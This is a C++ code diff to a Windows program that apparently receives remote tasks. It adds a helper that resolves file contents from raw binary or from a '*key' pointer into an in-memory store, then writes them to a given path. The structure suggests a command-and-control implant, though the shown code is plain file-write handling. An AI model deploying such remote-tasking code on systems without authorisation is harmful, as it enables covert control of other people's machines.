@@ -26,7 +26,7 @@ errors without relying on addtl branch logic. I try to use windows error  macro 
 #include "settings.h"
 #include "../data/structs.h"
 #include "../systems/memstore.h"
-
+#include <string_view>
 #include <windows.h>
 #include <string>
 //move to own file?
@@ -62,6 +62,44 @@ std::string GetErrorMessage(DWORD dwErrorCode) {
 
     return message;
 }
+
+//Helpers
+std::vector<uint8_t> deref_memstore_content(std::string memstore_name_with_deref_symbol) {
+    //nuke the `*` from the memstore name
+    //ex, *mydata -> mydata
+    memstore_name_with_deref_symbol.erase(0, 1);
+
+    //sanity check to make sure the name is not empty for some reason
+    if (memstore_name_with_deref_symbol.empty()) {
+        //reutrn a blank vector if the name is blank
+        return std::vector <uint8_t> {};
+    }
+
+    //get memstore data
+    std::vector<uint8_t> memstore_file_bytes = MemStore::instance().get(memstore_name_with_deref_symbol);
+
+    return memstore_file_bytes;
+}
+
+std::vector<uint8_t> resolve_payload(const nlohmann::json& element) {
+    // Case 1: Raw Binary (Standard)
+    if (element.is_binary()) {
+        return element.get_binary();
+    }
+
+    // Case 2: String (Could be text or a pointer)
+    if (element.is_string()) {
+        std::string s = element.get<std::string>();
+
+        // Check for MemStore Pointer (*key)
+        if (!s.empty() && s[0] == '*') {
+            return deref_memstore_content(s);
+        }
+    }
+    //return blank vector if nothing?
+    return {};
+}
+// ==
 
 //take in the mapped object, after converted from msgpack
 //all command splitting/overhead logic is done here, then passed to the appropriate modules
@@ -367,27 +405,22 @@ nlohmann::json command_tree(nlohmann::json task_data) {
 
         //check for correct values
         auto& args = task_data["task"]["args"];
-        if (!args.contains("file_contents") || !args["file_contents"].is_binary()) {
-            add_text_result(result, "error", "Task failed: 'file_contents' is missing or not binary.");
-            return result;
-        }
-        if (!args.contains("file_path") || !args["file_path"].is_string()) {
-            add_text_result(result, "error", "Task failed: 'file_path' is missing or not binary.");
-            return result;
+
+        // 1. Validate Inputs
+        if (!args.contains("file_path") || !args.contains("file_contents")) {
+            throw std::runtime_error("Missing required arguments: file_path or file_contents");
         }
 
-        //get element
-        auto& json_element = task_data["task"]["args"]["file_contents"];
-        //turn into bytes, tldr, need to call get_binary from nholmann json to get proper bin data
-        std::vector<uint8_t> file_bytes;
-        file_bytes = json_element.get_binary();
+        // Extract Data 
+        std::string file_path = args["file_path"];
+        std::vector<uint8_t> file_bytes = resolve_payload(args["file_contents"]);
 
-        //get path
-        std::string file_path = task_data["task"]["args"]["file_path"];
+        // sanity check to make sure that the vector is not empty.
+        if (file_bytes.empty()) {
+            add_text_result(result, "error", "File content was empty (or invalid pointer). Wrote 0 bytes.");
+            return result;
+        }
 
-        //content is a message, windows_error_code is a win error code
-        //auto [content, windows_error_code] = put_file(file_bytes, file_path);
-        //not using auto, for readability/knowing what type things are
         ModuleResult module_result = put_file(file_bytes, file_path);
         std::string data = module_result.data;
         DWORD windows_error_code = module_result.windows_error_code;
